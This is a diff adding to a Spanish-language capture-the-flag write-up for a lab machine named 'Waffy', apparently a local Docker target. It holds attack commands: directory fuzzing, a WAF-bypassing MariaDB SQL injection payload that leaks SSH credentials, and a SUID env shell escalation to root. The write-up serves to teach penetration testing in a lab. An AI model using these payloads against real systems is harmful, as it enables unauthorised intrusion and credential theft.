@@ -48,4 +48,137 @@ Lo más relevante es ese 403, vamos a visitar la página.
 
 Un panel, miramos el código fuente y no vemos nada, vamos a fuzzear
 
+```bash
+ feroxbuster --url "http://172.17.0.2/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -x php,txt,html,zip, ,log,js,cgi,js
+```
+
+
+![Nmap Scan](images/Waffy/4.png)
+
+
+no encontramos mucho mas salvo que redirecciones, intentamos un ataque con fuerzabruta con hydra y nos reporta falsos positivos, teniendo solo eso,
+vamos a intentar una inyeccion sql
+
+
+![Nmap Scan](images/Waffy/5.png)
+
+
+Y nos redirecciona
+
+
+![Nmap Scan](images/Waffy/6.png)
+
+
+Algo lo ha bloqueado, vamos a ver si hay un waf detrás
+
+
+```bash
+ wafw00f http://172.17.0.2
+```
+
+
+![Nmap Scan](images/Waffy/7.png)
+
+
+
+## FASE INTRUSIÓN
+
+efectivamente lo hay, aquí es ir probando inyecciones con diccionarios etc, pero al final, en los fallos salta que es maria db, mirando documentaciones:
+
+```bash
+https://mariadb.com/docs/server/reference/sql-functions/special-functions/json-functions/json_valid
+```
+
+encuentro esta query:
+
+```
+JSON_VALID(value)
+```
+
+así que voy a intentar inyectar algo con esta estructra:
+
+```
+'OR JSON_VALID(value)- --
+```
+
+En valor intento con name, password, nombre, password, pass y por fin:
+
+```
+'OR JSON_VALID(id)- --
+```
+
+
+![Nmap Scan](images/Waffy/8.png)
+
+y conseguimos unas credenciales para SSH
+
+
+![Nmap Scan](images/Waffy/9.png)
+
+
+
+Nos conectamos por SSH con las credenciales:
+
+```bash
+ssh baluton@172.17.0.2
+```
+
+![Nmap Scan](images/Waffy/10.png)
+
+
+
+##  FASE ESCALADA PRIVILEGIOS
+
+Vamos a mirar las versiones del kernel por si es vulnerable, si estamos en alfún grupo extraño, si tienemos privilegios suudo y no encontramos nada hasta buscar binarios con permiso SUID:
+
+
+```
+baluton@060d666f2127:~$ uname -a
+Linux 060d666f2127 6.12.33+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.12.33-1kali1 (2025-06-25) x86_64 x86_64 x86_64 GNU/Linux
+baluton@060d666f2127:~$ id
+uid=1000(baluton) gid=1000(baluton) groups=1000(baluton)
+baluton@060d666f2127:~$ sudo -l
+-bash: sudo: command not found
+baluton@060d666f2127:~$ find / -perm -4000 2>/dev/null
+/usr/bin/chfn
+/usr/bin/env
+/usr/bin/passwd
+/usr/bin/su
+/usr/bin/mount
+/usr/bin/umount
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+baluton@060d666f2127:~$ 
+```
+
+
+![Nmap Scan](images/Waffy/11.png)
+
+
+Vemos `/usr/bin/env` , nos vamos a nuestra página de confianza para explotación de binarios y buscamos `env`
+
+```bash
+https://gtfobins.github.io/
+```
+
+
+
+![Nmap Scan](images/Waffy/12.png)
+
+
+Así pues vamos a explotar la vulnerabilidad:
+
+```bash
+/usr/bin/env /bin/bash -p
+```
+
+![Nmap Scan](images/Waffy/13.png)
+
+
+
+
+
 
